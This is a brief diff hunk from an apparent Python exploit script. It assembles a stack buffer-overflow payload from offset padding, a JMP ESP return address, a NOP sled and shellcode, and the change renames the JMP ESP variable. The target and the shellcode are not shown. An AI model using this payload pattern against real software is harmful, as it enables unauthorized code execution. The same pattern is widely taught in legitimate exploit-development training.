@@ -291,7 +291,7 @@ nops = "\x90" * 32
 
 buf= "" 
 buf += "A" * (offset_srp - len(buf))
-buf += ptr_jmp_esp
+buf += jmp_esp
 buf += nops
 buf += shellcode
 buf += "\n"
